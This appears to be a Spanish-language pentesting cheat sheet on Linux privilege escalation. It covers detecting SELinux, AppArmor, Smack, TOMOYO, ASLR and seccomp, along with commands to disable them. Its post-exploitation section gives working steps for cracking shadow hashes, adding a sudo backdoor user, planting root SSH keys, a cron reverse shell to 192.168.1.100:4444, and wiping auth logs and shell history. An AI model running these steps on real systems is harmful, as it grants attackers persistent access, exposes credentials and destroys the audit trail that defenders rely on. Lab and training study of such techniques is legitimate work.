# Exploits de Kernel, Protecciones del Sistema y Post-Explotación

## Protecciones MAC del Kernel Linux

**¿Qué es MAC?**
Control de Acceso Obligatorio (Mandatory Access Control) — capa de seguridad adicional por encima de los permisos normales de Linux (DAC). Aunque tengas SUID, capabilities o seas root, el MAC puede seguir bloqueando acciones específicas según políticas definidas en el kernel.

Opera a través del framework **LSM (Linux Security Modules)** — un conjunto de hooks en el kernel que interceptan operaciones sensibles antes de ejecutarlas.

**Por qué importa en privesc:**
Si el sistema tiene MAC activo en modo `Enforcing`, tus exploits pueden fallar aunque técnicamente tengas los permisos correctos. Lo primero que haces al entrar es verificar si hay MAC activo y en qué modo.

---

### 1. Verificación general — qué LSM está activo

```bash
# Ver qué módulos de seguridad están cargados en el kernel
cat /sys/kernel/security/lsm
# Output típico:
# lockdown,capability,selinux       → SELinux activo
# lockdown,capability,apparmor      → AppArmor activo
# lockdown,capability               → solo protecciones básicas, sin MAC

# Ver qué hay en el directorio de seguridad del kernel
ls /sys/kernel/security/

# Ver desde el boot — qué se pasó como parámetro al kernel
cat /proc/cmdline | grep -i "security\|selinux\|apparmor\|smack"

# Ver módulos del kernel relacionados
lsmod | grep -i "selinux\|apparmor\|smack\|tomoyo"

# Ver desde los logs de arranque
dmesg | grep -i "selinux\|apparmor\|smack\|lsm"

# Ver filesystems de seguridad montados
cat /proc/mounts | grep "securityfs\|selinux\|apparmor"
```

---

### 2. SELinux (Security-Enhanced Linux)

**Cómo funciona:** asigna etiquetas de contexto de seguridad a cada proceso y archivo. Las operaciones se permiten o deniegan según las reglas entre esos contextos, independientemente de los permisos Unix normales.

### Detectar si está activo

```bash
# Forma más directa — devuelve el modo actual
getenforce
# Enforcing  → activo y bloqueando operaciones
# Permissive → activo pero solo logea, no bloquea
# Disabled   → completamente apagado

# Más detalle
sestatus

# Desde el kernel directamente (no necesita herramientas instaladas)
cat /sys/fs/selinux/enforce
# 1 = Enforcing
# 0 = Permissive
# Error "no existe" = SELinux no está montado = inactivo
```

### Ver contextos de seguridad

```bash
# Ver el contexto de seguridad de tu usuario/proceso actual
id -Z

# Ver contexto de procesos corriendo
ps -eZ | grep bash
ps -eZ | grep <nombre_proceso>

# Ver contexto de archivos — la columna extra entre permisos y nombre
ls -Z /etc/passwd
ls -Z /home/

# Ver contexto del proceso actual desde /proc
cat /proc/self/attr/current

# Ver el archivo de configuración
cat /etc/selinux/config
```

### Qué significa para tu ataque

```bash
# Si getenforce devuelve "Enforcing":
# → Aunque tengas eUID=0 por SUID, SELinux puede bloquear
#   operaciones específicas según el contexto del binario
# → Revisa el contexto del binario que intentas abusar:
ls -Z /usr/bin/find
# unconfined_u:object_r:bin_t:s0 → sin restricciones extra
# system_u:object_r:bin_t:s0     → bajo política del sistema

# Si getenforce devuelve "Permissive":
# → Puedes explotar con normalidad, solo deja logs
# → Los logs van a /var/log/audit/audit.log
```

---

### 3. AppArmor

**Cómo funciona:** usa perfiles basados en rutas de archivos para restringir qué puede hacer cada programa. Un perfil define exactamente qué archivos puede leer, escribir y ejecutar un binario específico.

### Detectar si está activo

```bash
# Estado general — necesita estar en /usr/sbin/
aa-status
/usr/sbin/aa-status

# Desde el kernel — no necesita herramientas
cat /sys/module/apparmor/parameters/enabled
# Y = activo
# N = inactivo
# Error = no está cargado

# Ver perfiles cargados y su modo
cat /sys/kernel/security/apparmor/profiles
# nombre_perfil (enforce)   → bloqueando
# nombre_perfil (complain)  → solo logea, equivalente a Permissive
```

### Ver qué perfil tiene un proceso

```bash
# Tu proceso actual
cat /proc/self/attr/current
cat /proc/$$/attr/current
# Si devuelve "unconfined" → sin perfil → sin restricciones
# Si devuelve nombre de perfil → tiene restricciones

# Proceso específico por PID
cat /proc/<PID>/attr/current

# Ver todos los procesos con su perfil
ps auxZ | grep -v unconfined
# Los que no sean unconfined tienen restricciones AppArmor
```

### Qué significa para tu ataque

```bash
# Si el binario que intentas abusar dice "unconfined":
cat /proc/$(pgrep bash)/attr/current
# → Sin restricciones de AppArmor, puedes explotar normal

# Si tiene un perfil en modo enforce:
# → Aunque el binario tenga SUID o capability, AppArmor
#   puede bloquear que abra /etc/shadow, ejecute /bin/bash, etc.
# → Busca si el perfil tiene huecos (complain mode o reglas permisivas)

# Los logs de bloqueos van a:
cat /var/log/syslog | grep "apparmor"
cat /var/log/kern.log | grep "apparmor"
dmesg | grep "apparmor"
```

---

### 4. Smack (Simplified MAC Kernel)

**Cómo funciona:** usa etiquetas simples en procesos y objetos. Las reglas definen qué etiqueta puede acceder a qué. Más simple que SELinux, común en sistemas embebidos.

```bash
# ¿Está montado el filesystem de Smack?
ls /sys/fs/smackfs
cat /sys/fs/smackfs/load    # ver reglas cargadas

# Tu etiqueta actual
cat /proc/self/attr/current

# Verificar si está en mounts
cat /proc/mounts | grep smack
```

---

### 5. TOMOYO Linux

**Cómo funciona:** aprende y restringe las rutas de ejecución de programas basándose en análisis dinámico. Define qué rutas de archivo puede seguir cada proceso.

```bash
# ¿Está activo?
cat /sys/kernel/security/tomoyo/version

# Ver políticas cargadas
cat /sys/kernel/security/tomoyo/domain_policy

# Desde mounts
cat /proc/mounts | grep tomoyo
```

---

### 6. One-liner de enumeración rápida — todo de una vez

```bash
echo "=== LSM activo ===" && \
cat /sys/kernel/security/lsm 2>/dev/null; \
echo -e "\n=== SELinux ===" && \
getenforce 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null || echo "no instalado"; \
echo -e "\n=== AppArmor ===" && \
cat /sys/module/apparmor/parameters/enabled 2>/dev/null || echo "no instalado"; \
echo -e "\n=== Smack ===" && \
ls /sys/fs/smackfs 2>/dev/null || echo "no instalado"; \
echo -e "\n=== TOMOYO ===" && \
cat /sys/kernel/security/tomoyo/version 2>/dev/null || echo "no instalado"; \
echo -e "\n=== Mi contexto actual ===" && \
cat /proc/self/attr/current 2>/dev/null
```

---

### 7. Tabla resumen — qué implica cada resultado

| Resultado | Implicación para el ataque |
|-----------|---------------------------|
| SELinux **Enforcing** | Exploits pueden bloquearse aunque tengas SUID/caps — revisa contextos con `ls -Z` y `id -Z` |
| SELinux **Permissive** | Solo logea, no bloquea — explota con normalidad |
| SELinux **Disabled** | Sin restricciones de SELinux |
| AppArmor activo + perfil **enforce** | El binario tiene restricciones de ruta — puede bloquear tu exploit |
| AppArmor activo + perfil **complain** | Solo logea — puedes explotar igual |
| AppArmor activo + proceso **unconfined** | Sin perfil asignado — sin restricciones |
| AppArmor **N** o inactivo | Sin restricciones de AppArmor |
| Smack/TOMOYO activos | Poco común en labs — verifica etiquetas con `/proc/self/attr/current` |
| `lsm` solo muestra `lockdown,capability` | Sin MAC configurado — solo permisos Unix normales |

---

### 8. Flujo de decisión al entrar a un sistema

```
cat /sys/kernel/security/lsm
            ↓
    ¿Aparece selinux?
    └─ Sí → getenforce
            ├─ Enforcing  → cuidado, revisa contextos antes de explotar
            ├─ Permissive → puedes explotar, solo deja logs
            └─ Disabled   → sin restricciones
            ↓
    ¿Aparece apparmor?
    └─ Sí → cat /proc/self/attr/current
            ├─ unconfined → sin restricciones para tu proceso
            └─ nombre_perfil → revisa qué permite ese perfil
            ↓
    ¿Nada de lo anterior?
    └─ Sin MAC → el sistema solo usa permisos Unix (DAC)
       → Procede con enumeración normal de SUID, capabilities, cron, etc.
```

## Protecciones del Sistema

### ASLR (Address Space Layout Randomization)

**¿Qué hace?**
Aleatoriza direcciones de memoria para dificultar exploits.

**Verificar:**

```bash
cat /proc/sys/kernel/randomize_va_space

# 0 = Deshabilitado (vulnerable)
# 1 = Parcialmente habilitado
# 2 = Totalmente habilitado (máximo)
```

**Deshabilitar (como root):**

```bash
echo 0 > /proc/sys/kernel/randomize_va_space

# Permanente - agregar a /etc/sysctl.conf:
echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf
sysctl -p
```

### SELinux (Security-Enhanced Linux)

**¿Qué hace?**
Control de acceso obligatorio (MAC) en Red Hat/CentOS.

**Verificar Estado:**

```bash
getenforce
sestatus

# Salida:
# Enforcing = Habilitado y activo
# Permissive = Habilitado pero sin bloquear
# Disabled = Deshabilitado
```

**Deshabilitar (como root):**

```bash
setenforce 0

# Permanente - editar /etc/selinux/config:
sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config

# Requiere reboot para efecto completo
```

### AppArmor

**¿Qué hace?**
Control de acceso obligatorio (MAC) en Debian/Ubuntu.

**Verificar Estado:**

```bash
aa-status
systemctl status apparmor

# Ver perfiles
cat /etc/apparmor.d/*
```

**Deshabilitar (como root):**

```bash
systemctl disable apparmor
systemctl stop apparmor

# O remover paquete:
sudo apt remove apparmor

# Permanente - editar /etc/default/grub:
GRUB_CMDLINE_LINUX="apparmor=0"
sudo update-grub
```

### Seccomp (Secure Computing)

**¿Qué hace?**
Restringe syscalls disponibles para procesos.

**Verificar:**

```bash
grep -i seccomp /proc/self/status

# Si aparece: Seccomp = 1, está en modo filter
```

### Grsecurity / PaX

**¿Qué hace?**
Protecciones kernel adicionales.

**Verificar:**

```bash
uname -r | grep "grsec\|pax"
cat /proc/cmdline | grep "grsec\|pax"
```

### Control Flow Guard (CFG)

**¿Qué hace?**
Protege contra modificación del flujo de programas.

**Verificar en binarios:**

```bash
checksec exploit
checksec /bin/bash

# Ver protecciones:
# RELRO: Partial/Full
# Stack: Canary found/Not found
# NX: NX enabled/disabled
# PIE: PIE enabled/disabled
```

## Post-Explotación

### Verificar Acceso como Root

```bash
whoami
id
sudo -l

# Ver si puedes leer /etc/shadow
cat /etc/shadow
```

### Extraer Hashes

```bash
# Combinar passwd y shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crackear hashes (en Kali)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 1800 hashes.txt rockyou.txt
```

### Crear Usuario Backdoor

```bash
# Como root
useradd -m -p $(openssl passwd -1 Password123!) backdoor
usermod -aG sudo backdoor

# Verificar
id backdoor
sudo -l -U backdoor
```

### Agregar Clave SSH Pública

```bash
# Como root
mkdir -p /root/.ssh
echo "tu_clave_publica" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Desde Kali
ssh -i id_rsa root@objetivo
```

### Persistencia - Cron Job

```bash
# Como root
crontab -e

# Agregar:
* * * * * /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Listener en Kali:
nc -lvp 4444
```

### Persistencia - SSH Backdoor

```bash
# Modificar /etc/ssh/sshd_config
echo "Port 2222" >> /etc/ssh/sshd_config
systemctl restart ssh

# Conectar por puerto alternativo
ssh -p 2222 root@objetivo
```

### Limpiar Logs

```bash
# Ver logs del sistema
cat /var/log/auth.log | grep usuario

# Limpiar
> /var/log/auth.log
> /var/log/syslog
> /var/log/secure
> /var/log/access.log

# Limpiar historial bash
history -c
> ~/.bash_history

# Limpiar logs de comando ejecutados
unset HISTFILE
export HISTFILE=/dev/null
```

### Monitoreo de Actividad

```bash
# Ver conexiones activas
ss -antp
netstat -antp

# Ver procesos específicos
pgrep -a ssh
pgrep -a nc

# Logs en tiempo real
tail -f /var/log/auth.log
journalctl -u ssh -f
```

## Checklist de Escalada de Privilegios

1. **Enumeración inicial** ✓
   - whoami, id, sudo -l
   - uname -a, cat /etc/os-release

2. **Búsqueda de credenciales** ✓
   - history, .bash_history
   - /etc/shadow (si accesible)
   - Archivos de config con passwords

3. **SUID/SGID** ✓
   - find / -perm -4000 / -6000
   - GTFOBins exploitation

4. **Sudo Rights** ✓
   - sudo -l
   - Comandos permitidos sin password

5. **Grupos Privilegiados** ✓
   - id | grep docker/lxd/sudo/wheel
   - Group-based escalation

6. **CRON/PATH** ✓
   - crontab -l, /etc/crontab
   - echo $PATH, PATH injection

7. **Servicios Vulnerables** ✓
   - ps aux, systemctl list-units
   - Servicios ejecutados como root

8. **Kernel Exploits** ✓
   - uname -r, searchsploit
   - Compilar y ejecutar exploit

9. **Post-Explotación** ✓
   - Crear usuario backdoor
   - SSH keys, persistencia
   - Limpiar logs
